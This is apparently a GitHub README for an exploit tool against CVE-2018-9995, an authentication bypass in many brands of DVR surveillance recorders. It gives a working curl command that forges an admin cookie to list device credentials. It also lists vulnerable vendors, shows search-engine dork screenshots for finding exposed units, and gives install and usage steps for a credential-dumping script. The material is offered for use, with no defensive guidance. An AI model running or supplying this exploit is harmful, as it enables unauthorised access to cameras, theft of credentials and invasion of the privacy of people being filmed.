#  [Tool] show DVR Credentiales

	[*] Exploit Title:       "Gets DVR Credentials" 
	[*] CVE:                 CVE-2018-9995
	[*] CVSS Base Score v3:  7.3 / 10
	[*] CVSS Vector String:  CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
	[*] Date:                09/04/2018
	[*] Exploit Author:      Fernandez Ezequiel ( twitter:@capitan_alfa )

	
![DVR_wall](screenshot/videoWall.jpg) 

### Exploit:

```
	$> curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"

```
## tested in DVR (banner/vendor ?):
	Novo
	CeNova
	QSee
	Pulnix
	XVR 5 in 1 (title: "XVR Login")
	Securus,  - Security. Never Compromise !! - 
	Night OWL
	DVR Login
	HVR Login
	MDVR Login

# On the Wild:
![DVR_dorks_0](screenshot/cow/zoomEyes.jpg) 
![DVR_dorks_2](screenshot/cow/shodan_1.png) ![DVR_dorks_1](screenshot/cow/google_1.png) 
![DVR_dorks_3](screenshot/cow/shodan_2.png)

## Possible Banners frontend (web):
![DVR_login_1](screenshot/loginFront/login_1.png)
![DVR_login_2](screenshot/loginFront/login_2.png)
![DVR_login_3](screenshot/loginFront/login_3.png)
![DVR_login_4](screenshot/loginFront/login_4.png)
![DVR_login_5](screenshot/loginFront/login_5.png)
![DVR_login_6](screenshot/loginFront/login_6.png)
![DVR_login_7](screenshot/loginFront/login_7.png)
![DVR_login_8](screenshot/loginFront/login_9.png)
![DVR_login_10](screenshot/loginFront/login_10.png)

## Indoor:
![DVR_indoor_1](screenshot/indoor/in_x.png)
![DVR_indoor_2](screenshot/indoor/in_x1.png)
![DVR_indoor_3](screenshot/indoor/in_1.png)
![DVR_indoor_4](screenshot/indoor/in_2.png)
![DVR_indoor_5](screenshot/indoor/in_3.png)
![DVR_indoor_6](screenshot/indoor/in_4.png)
![DVR_indoor_7](screenshot/indoor/in_5.png)


# TOOL: "Show all DVR Credentials"

## Quick start

	usr@pwn:~$ git clone https://github.com/ezelf/CVE-2018-9995_dvr_credentials.git
	usr@pwn:~$ cd CVE-2018-9995_dvr_credentials
	usr@pwn:~$ pip install -r requirements.txt

## help

	usage: getDVR_Credentials.py [-h] [-v] --host HOST [--port PORT]

	[+] Obtaining Exposed credentials

	optional arguments:
	  -h, --help     show this help message and exit
	  -v, --version  show program's version number and exit
	  --host HOST    Host
	  --port PORT    Port

	[+] Demo: python getDVR_Credentials.py --host 192.168.1.101 -p 81


## Pocs (Output) :
![DVR_poc_4](screenshot/toolOutput/poc_4.png)
![DVR_poc_3](screenshot/toolOutput/poc_3.png)
![DVR_poc_2](screenshot/toolOutput/poc_2.png)
![DVR_poc_1](screenshot/toolOutput/poc_1.png)



### Blog:
http://misteralfa-hack.blogspot.cl/2018/04/update-dvr-login-bypass-cve-2018-9995.html


I see you... ! xd